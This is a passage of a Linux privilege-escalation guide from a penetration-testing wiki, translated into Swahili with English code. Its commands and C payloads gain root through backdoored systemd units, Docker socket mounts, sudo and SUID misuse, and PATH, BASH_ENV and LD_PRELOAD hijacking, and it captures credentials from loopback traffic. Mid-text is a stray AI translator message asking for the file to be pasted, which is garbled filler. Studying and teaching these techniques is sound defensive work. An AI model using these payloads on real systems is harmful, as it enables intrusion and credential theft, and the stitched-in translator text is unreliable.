- `Service`: Inaainisha jina la unit ya **service** **kuamilishwa** kwenye **trafiki inayokuja**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Default yake ni service yenye jina sawa na socket (kwa kubadilisha kiongezi). Katika hali nyingi, haitakuwa muhimu kutumia chaguo hili.

### Faili za .socket zinazoweza kuandikwa

Ikiwa utapata faili ya `.socket` inayoweza kuandikwa unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket inavyoundwa. Kwa hiyo, **huenda utahitaji kusubiri hadi mashine itakaporejeshwa.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Socket activation + writable unit path (create missing service)

Mwingine misconfiguration yenye athari kubwa ni:

- unit ya socket yenye `Accept=no` na `Service=<name>.service`
- unit ya service iliyorejelezwa haipo
- mshambulizi anaweza kuandika katika `/etc/systemd/system` (au njia nyingine ya kutafuta unit)

Katika hali hiyo, mshambulizi anaweza kuunda `<name>.service`, kisha kusababisha trafiki kwenye socket ili systemd ianze na itekeleze service mpya kama root.

Quick flow:
```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```
### Sockets zinazoweza kuandikwa

Ikiwa utagundua **socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets na sio kuhusu faili za config `.socket`_), kisha, **unaweza kuwasiliana** na socket hiyo na labda exploit a vulnerability.

### Orodhesha Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho mbichi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets listening for HTTP** requests (_sina kuzungumzia .socket files bali faili zinazofanya kazi kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
Ikiwa socket **inajibu kwa ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit udhaifu**.

### Docker socket inayoweza kuandikwa

Docker socket, mara nyingi iko kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi la `docker`. Kuwa na haki za kuandika kwenye socket hii kunaweza kusababisha privilege escalation. Hapa kuna muhtasari wa jinsi hii inaweza kufanywa na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation with Docker CLI**

Ikiwa una haki za kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Amri hizi zinakuwezesha kuendesha container yenye root-level access kwa host's file system.

#### **Kutumia Docker API Moja kwa moja**

Katika matukio ambapo Docker CLI haipatikani, Docker socket bado inaweza kutumika kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Tuma ombi la kuunda container ambalo linamonti root directory ya host system.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anzisha container mpya uliouunda:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Tumia `socat` kuanzisha muunganisho kwa container, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuweka muunganisho wa `socat`, unaweza kutekeleza amri moja kwa moja ndani ya container ukiwa na root-level access kwa filesystem ya host.

### Nyingine

Kumbuka kwamba ikiwa una write permissions juu ya docker socket kwa sababu uko **inside the group `docker`** una [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ikiwa [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **more ways to break out from docker or abuse it to escalate privileges** katika:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

Ikiwa unagundua kuwa unaweza kutumia amri ya **`ctr`** soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

Ikiwa unagundua kuwa unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwani **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus ni mfumo wa kitaalamu wa **inter-Process Communication (IPC)** unaowawezesha applications kuingiliana kwa ufanisi na kushirikiana data. Umeundwa kwa kuzingatia mfumo wa kisasa wa Linux, na hutoa mfumo thabiti wa aina mbalimbali za mawasiliano ya applications.

Mfumo ni wenye ufanisi na wenye utofauti, ukisaidia IPC za msingi ambazo zinaboresha kubadilishana data kati ya processes, ikikumbusha **enhanced UNIX domain sockets**. Zaidi ya hayo, husaidia kusambaza matukio au signals, ikichochea muunganisho usio na mshono kati ya vipengele vya mfumo. Kwa mfano, signal kutoka kwa daemon ya Bluetooth kuhusu simu inayoingia inaweza kumfanya player wa muziki kunyamaza, kuboresha uzoefu wa mtumiaji. Vilevile, D-Bus inasaidia remote object system, kurahisisha maombi ya huduma na invocation za methods kati ya applications, kuimarisha michakato ambayo hapo awali ilikuwa ngumu.

D-Bus hufanya kazi kwa mfano wa **allow/deny model**, ikisimamia ruhusa za ujumbe (method calls, signal emissions, n.k.) kulingana na athari ya jumla ya kanuni za sera zinazolingana. Sera hizi zinaeleza mwingiliano na bus, na zinaweza kuruhusu privilege escalation kupitia unyonyaji wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` umetolewa, ukielezea ruhusa kwa user root kumiliki, kutuma, na kupokea ujumbe kutoka `fi.w1.wpa_supplicant1`.

Sera ambazo hazina user au group maalum zinatumika kwa wote, wakati sera za muktadha "default" zinatumika kwa wale wote ambao hawajashughulikiwa na sera maalum nyingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya enumerate na exploit D-Bus communication hapa:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mtandao**

Kila mara inavutia enumerate mtandao na kubaini nafasi ya mashine.

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### Tathmini ya haraka ya uchujaji wa outbound

Ikiwa host inaweza kuendesha amri lakini callbacks zinashindwa, tenganisha kwa haraka uchujaji wa DNS, transport, proxy, na route:
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### Open ports

Daima angalia huduma za mtandao zinazofanya kazi kwenye mashine ambayo haukuweza kuingiliana nayo kabla ya kuifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
Changanua listeners kwa bind target:

- `0.0.0.0` / `[::]`: zinapatikana kupitia interfaces zote za ndani.
- `127.0.0.1` / `::1`: local-only (good tunnel/forward candidates).
- Specific internal IPs (e.g. `10.x`, `172.16/12`, `192.168.x`, `fe80::`): kwa kawaida zinapatikana tu kutoka sehemu za ndani za mtandao.

### Mchakato wa tathmini wa huduma za ndani pekee

Ukipata udhibiti wa host, huduma zilizofungwa kwenye `127.0.0.1` mara nyingi zinapatikana kwa mara ya kwanza kutoka kwa shell yako. Mchakato mfupi wa ndani ni:
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS kama skana ya mtandao (hali ya mtandao pekee)

Mbali na ukaguzi wa PE wa ndani, linPEAS inaweza kuendeshwa kama skana maalum wa mtandao. Inatumia binaries zinazopatikana kwenye `$PATH` (kawaida `fping`, `ping`, `nc`, `ncat`) na haisakinishi zana yoyote.
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
Ukiweka `-d`, `-p`, au `-i` bila `-t`, linPEAS itafanya kazi kama skana ya mtandao tu (ikitupilia mbali mabaki ya privilege-escalation checks).

### Sniffing

Angalia kama unaweza sniff traffic. Ikiwa unaweza, unaweza kupata baadhi ya credentials.
```
timeout 1 tcpdump
```
Ukaguzi wa haraka wa vitendo:
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) ni muhimu hasa katika post-exploitation kwa sababu huduma nyingi za ndani pekee hutoa tokens/cookies/credentials huko:
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
I don't have the file contents. Please paste the contents of src/linux-hardening/privilege-escalation/README.md here (or upload the text). I will translate the English parts to Swahili, preserving all markdown/html/tags, paths and code.
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## Watumiaji

### Generic Enumeration

Angalia **ni wewe nani**, **ni ruhusa gani** ulizonazo, **ni watumiaji gani** wako kwenye mfumo, **ni ambao wanaweza kuingia** na **ni walio na ruhusa za root**:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Toleo fulani za Linux zilathiriwa na hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha ruhusa. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Makundi

Kagua ikiwa wewe ni **mwanachama wa kundi lolote** ambalo linaweza kukupa ruhusa za root:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Kagua ikiwa kuna kitu chochote kinachovutia kilichoko ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila zilizojulikana

Kama unajua **nywila yoyote ya mazingira** **jaribu kuingia kwa kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa haufikirii juu ya kusababisha noise nyingi na binaries za `su` na `timeout` ziko kwenye kompyuta, unaweza kujaribu kufanya brute-force mtumiaji ukitumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa parameta `-a` pia inajaribu brute-force watumiaji.

## Matumizi mabaya ya PATH inayoweza kuandikwa

### $PATH

Ikiwa ugundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuwa na uwezo wa **kuinua ruhusa** kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** yenye jina la amri ambayo itatekelezwa na mtumiaji mwingine (kiburi root) na ambayo **haitapakiwa kutoka folda iliyoko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na suid bit. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Kusanidiwa kwa sudo kunaweza kumruhusu mtumiaji kutekeleza amri fulani akiwa na vibali vya mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kuendesha `vim` kama `root`, sasa ni rahisi sana kupata shell kwa kuongeza ssh key kwenye root directory au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Maelekezo haya yanamruhusu mtumiaji **set an environment variable** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **iliyotokana na HTB machine Admirer**, ulikuwa **dhaifu kwa PYTHONPATH hijacking** kwa kupakia maktaba yoyote ya python wakati script ikitekelezwa kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV imehifadhiwa kupitia sudo env_keep → root shell

Ikiwa sudoers inahifadhi `BASH_ENV` (mfano, `Defaults env_keep+="ENV BASH_ENV"`), unaweza kutumia tabia ya kuanzisha isiyo na mwingiliano ya Bash kuendesha msimbo wowote kama root unapoita amri iliyoruhusiwa.

- Kwa nini inafanya kazi: Kwa shells zisizo na mwingiliano, Bash hutathmini `$BASH_ENV` na inasoma (sources) faili hiyo kabla ya kuendesha script lengwa. Sera nyingi za sudo zinaruhusu kuendesha script au shell wrapper. Iki `BASH_ENV` imehifadhiwa na sudo, faili yako itasomwa ikitumiwa na idhini za root.

- Mahitaji:
- Sudo rule unayoweza kuendesha (lengo lolote linaloiita `/bin/bash` bila mwingiliano, au bash script yoyote).
- `BASH_ENV` kuwepo katika `env_keep` (angalia kwa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Kuimarisha:
- Ondoa `BASH_ENV` (na `ENV`) kutoka `env_keep`, tumia `env_reset`.
- Epuka shell wrappers kwa amri zinazoruhusiwa na sudo; tumia binaries ndogo.
- Fikiria kurekodi I/O ya sudo na kutuma tahadhari wakati preserved env vars zinapotumika.

### Terraform kupitia sudo na HOME iliyohifadhiwa (!env_reset)

Iwapo sudo inaacha environment kama ilivyo (`!env_reset`) huku ikiruhusu `terraform apply`, `$HOME` inabaki kuwa ya mtumiaji anayetoa amri. Kwa hivyo Terraform inasoma **$HOME/.terraformrc** kama root na inazingatia `provider_installation.dev_overrides`.

- Elekeza provider inayohitajika kwenye directory inayoweza kuandikwa na weka plugin mbaya yenye jina la provider (mf., `terraform-provider-examples`):
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform itashindwa kwenye Go plugin handshake lakini inatekeleza payload kama root kabla ya kushindwa, ikiacha SUID shell nyuma.

### TF_VAR overrides + symlink validation bypass

Variables za Terraform zinaweza kutolewa kupitia environment variables `TF_VAR_<name>`, ambazo huendelea kuwepo wakati sudo inahifadhi environment. Uthibitishaji dhaifu kama `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` unaweza kupitishwa kwa symlinks:
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform hutatua symlink na kunakili `/root/root.txt` halisi hadi nafasi inayosomekewa na mshambuliaji. Njia ile ile inaweza kutumika **kuandika** kwenye njia zenye ruhusa kwa kuunda mapema symlink za marudio (kwa mfano, kuelekeza provider’s destination path ndani ya `/etc/cron.d/`).

### requiretty / !requiretty

Katika baadhi ya distributions za zamani, sudo inaweza kusanidiwa na `requiretty`, ambayo inalazimisha sudo itekelezwe tu kutoka interactive TTY. Ikiwa `!requiretty` imewekwa (au chaguo hakipo), sudo inaweza kutekelezwa kutoka muktadha zisizo-interactive kama reverse shells, cron jobs, au scripts.
```bash
Defaults !requiretty
```
This is not a direct vulnerability by itself, but it expands the situations where sudo rules can be abused without needing a full PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Ikiwa `sudo -l` inaonyesha `env_keep+=PATH` au `secure_path` yenye path inayoweza kuandikwa na mshambuliaji (mfano, `/home/<user>/bin`), amri yoyote isiyo na njia kamili ndani ya lengo liloruhusiwa na sudo inaweza kuingiliwa/kuingizwa na toleo mbadala.

- Mahitaji: kanuni ya sudo (kwa kawaida `NOPASSWD`) inayotekeleza script/binary inayoitisha amri bila njia kamili (`free`, `df`, `ps`, n.k.) na entry ya PATH inayoweza kuandikwa ambayo inatafutwa kwanza.
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Njia za bypass za utekelezaji wa Sudo
**Jump** kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumiwa (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Hatua za kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bila command path

Ikiwa **sudo permission** imetolewa kwa amri moja tu **bila kufafanua path**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha variable ya PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Teknika hii pia inaweza kutumika ikiwa **suid** binary **inatekeleza amri nyingine bila kubainisha njia yake (daima angalia kwa** _**strings**_ **yaliyomo kwenye SUID binary isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

Ikiwa **suid** binary **inatekeleza amri nyingine kwa kubainisha njia**, basi unaweza kujaribu **export a function** iitwayo kwa jina la amri ambayo faili ya suid inaiita.

Kwa mfano, ikiwa **suid** binary inaita _**/usr/sbin/service apache2 start**_, lazima ujaribu kuunda function hiyo na kui-export:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, utakapoita suid binary, function hii itatekelezwa

### Script inayoweza kuandikwa inayotekelezwa na SUID wrapper

Usanidi mbaya wa kawaida wa custom-app ni wrapper ya root-owned SUID binary inayotekeleza script, huku script yenyewe ikiwa inaweza kuandikwa na low-priv users.

Mfano wa kawaida:
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
Ikiwa `/usr/local/bin/backup.sh` inaweza kuandikwa, unaweza kuongeza amri za payload kisha utekeleze SUID wrapper:
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Uhakiki wa haraka:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Njia hii ya mashambulizi ni ya kawaida hasa katika "matengenezo"/"chelezo" wrappers zilizopakiwa katika `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kubainisha moja au zaidi ya maktaba za kushirikiwa (.so files) ambazo loader inazopakia kabla ya nyingine zote, ikiwemo standard C library (`libc.so`). Mchakato huu unajulikana kama kupakia awali maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwa executables za **suid/sgid**, mfumo unaweka masharti fulani:

- Loader haizingatii **LD_PRELOAD** kwa executables ambapo real user ID (_ruid_) haifani na effective user ID (_euid_).
- Kwa executables zenye **suid/sgid**, maktaba zinazopakiwa awali ni zile zilizopo katika standard paths ambazo pia ni **suid/sgid**.

Kuongezeka kwa ruhusa kunaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na output ya `sudo -l` inajumuisha taarifa **env_keep+=LD_PRELOAD**. Uteuzi huu unaruhusu variable ya mazingira **LD_PRELOAD** kubaki na kutambulika hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezaji wa msimbo wowote kwa ruhusa zilizoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **compile it** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **escalate privileges** inayoendeshwa
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc sawa inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti **LD_LIBRARY_PATH** env variable, kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Unaponakutana na binary iliyo na ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni desturi nzuri kuthibitisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kufanywa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaweza kuashiria uwezekano wa exploitation.

Ili kufanya exploit hili, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara tu ukichanganuliwa na kukimbizwa, unalenga kuinua ruhusa kwa kubadilisha ruhusa za faili na kutekeleza shell yenye ruhusa zilizoinuliwa.

Jenga faili ya C iliyotajwa hapo juu kuwa shared object (.so) kwa kutumia:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoharibiwa kunapaswa kuamsha exploit, ikiruhusu uwezekano wa kuingia udhibiti wa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeona SUID binary inayopakia library kutoka kwenye folder ambapo tunaweza kuandika, hebu tuunde library hiyo kwenye folder hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kwamba maktaba uliyotengeneza inahitaji kuwa na kazi iitwayo `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo mwashambulizi anaweza kuzitumia kuvuka vikwazo vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **tu kuingiza arguments** katika amri.

Mradi hukusanya functionalities halali za Unix binaries ambazo zinaweza kutumiwa vibaya kutoroka restricted shells, kuongeza au kudumisha elevated privileges, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha kazi nyingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

